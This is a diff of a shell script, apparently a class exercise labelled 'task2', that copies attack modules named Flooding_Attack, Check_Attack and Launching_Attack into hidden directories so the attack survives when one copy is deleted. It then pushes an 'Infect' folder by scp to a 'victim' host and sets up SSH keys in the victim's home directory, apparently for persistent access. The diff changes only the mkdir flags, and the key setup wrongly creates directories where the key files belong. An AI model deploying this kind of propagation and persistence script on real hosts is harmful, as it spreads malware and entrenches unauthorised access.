@@ -1,13 +1,13 @@
 # task2
 # replication attack file to two hidden files
 Hidden1="../../.etc/.qq"
-mkdir $Hidden1
+mkdir -p $Hidden1
 cp ./Infect/Flooding_Attack $Hidden1
 cp ./Infect/Check_Attack $Hidden1
 cp ./Infect/Launching_Attack $Hidden1
 
 Hidden2="../../.Launch_Attack"
-mkdir $Hidden2
+mkdir -p $Hidden2
 cp ./Infect/Launching_Attack $Hidden2
 
 # When one of attack modules is removed, the attack can still be launched by the other
@@ -23,8 +23,8 @@ scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-mkdir "$SSH_PATH"/id_rsa.pub
-mkdir "$SSH_PATH"/authorized_keys
+mkdir -p "$SSH_PATH"/id_rsa.pub
+mkdir -p "$SSH_PATH"/authorized_keys
 
 chmod 700 "$SSH_PATH"
 ssh-keygen
